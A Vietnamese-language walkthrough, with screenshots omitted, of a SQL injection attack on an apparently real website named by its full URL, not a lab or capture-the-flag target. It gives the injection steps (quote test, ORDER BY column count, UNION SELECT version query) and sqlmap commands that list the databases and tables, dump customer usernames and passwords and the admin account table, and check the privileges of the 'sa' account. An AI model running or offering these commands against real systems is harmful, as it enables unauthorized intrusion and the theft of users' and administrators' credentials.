# Triển khai WEB
#### Thực hiện test trên web site `https://diversityplus.com/FinTOC/DiversityChampions2.aspx?id=2TOC2021`
![alt text](image.png)
#### Tiến hành kiểm tra xem web site này có dính lỗi SQL injection không bằng lệnh.
#### `https://diversityplus.com/FinTOC/DiversityChampions2.aspx?id=2TOC2021'`
#### Ta thấy rằng web site này đã bị dính lỗi sqli
![alt text](image-1.png)
#### Tiếp theo xác định số cột của web để khai thác data.
#### Với lệnh `ORDER+BY+5--+-` thì web trả về lỗi.
![alt text](image-2.png)
#### Giảm xuống `ORDER+BY+4--+-` thì lúc này web hết lỗi.
![alt text](image-3.png)
#### Tìm cột có thể lấy ra được thông tin dữ liệu.
#### `https://diversityplus.com/FinTOC/DiversityChampions2.aspx?id=2TOC2021'AND+1=0+UNION+SELECT+1,2,3,4--+-`
![alt text](image-4.png)
#### Lấy ra version mà web sử dụng.
#### `https://diversityplus.com/FinTOC/DiversityChampions2.aspx?id=2TOC2021'AND+1=0+UNION+SELECT+1,2,@@version,4--+-`
![alt text](image-5.png)
#### Kiểm tra trong sqlmap ta cũng lấy được version mà web dùng là  `Microsoft SQL Server`
#### `sqlmap.py -u "https://diversityplus.com/FinTOC/DiversityChampions2.aspx?id=2TOC2021" --dbs`
![alt text](image-6.png)
![alt text](image-7.png)
#### Lấy ra list database mà website xử dụng.
![alt text](image-8.png)
![alt text](image-9.png)
![alt text](image-10.png)
...
#### Tiến hành lấy ra các bảng từ database vừa tìm được `DiversityPlusDB`
#### `sqlmap.py -u "https://diversityplus.com/FinTOC/DiversityChampions2.aspx?id=2TOC2021" -D DiversityPlusDB --tables`
![alt text](image-11.png)
![alt text](image-12.png)
#### Tiến hành lấy dữ liệu từ bảng `CustInfo`
#### `sqlmap.py -u "https://diversityplus.com/FinTOC/DiversityChampions2.aspx?id=2TOC2021" -D DiversityPlusDB -T CustInfo --columns`
![alt text](image-13.png)
#### Lấy ra tài khoản mật khẩu của người dùng.
#### `sqlmap.py -u "https://diversityplus.com/FinTOC/DiversityChampions2.aspx?id=2TOC2021" -D DiversityPlusDB -T CustInfo -C UserName,Password --dump`
![alt text](image-14.png)
![alt text](image-15.png)
#### Lấy ra tài khoản admin.
#### `sqlmap.py -u "https://diversityplus.com/FinTOC/DiversityChampions2.aspx?id=2TOC2021" -D DiversityPlusDB -T tblDPAdmin_UserMaster --columns`
![alt text](image-16.png)
#### Lấy dữ liệu từ các cột vừa tìm thấy.
#### `sqlmap.py -u "https://diversityplus.com/FinTOC/DiversityChampions2.aspx?id=2TOC2021" -D DiversityPlusDB -T tblDPAdmin_UserMaster -C UserID,UserRole,UserName,Pwd --dump`
![alt text](image-17.png)
#### Tiếp tục tiến hành kiểm tra xem tài khoản đó có phải tài khoản `sa` có thể thực hiện CRUD database hay không bằng lệnh
#### `sqlmap.py -u "https://diversityplus.com/FinTOC/DiversityChampions2.aspx?id=2TOC2021" -D DiversityPlusDB -T tblDPAdmin_UserMaster -C UserID,UserRole,UserName,Pwd --dump --privileges`
#### ==>Kết quả cho thấy tài khoản sa (một tài khoản mặc định trên SQL Server có quyền quản trị cao nhất) là administrator. Điều này có nghĩa tài khoản sa có toàn quyền kiểm soát cơ sở dữ liệu.
![alt text](image-18.png)
![alt text](image-19.png)




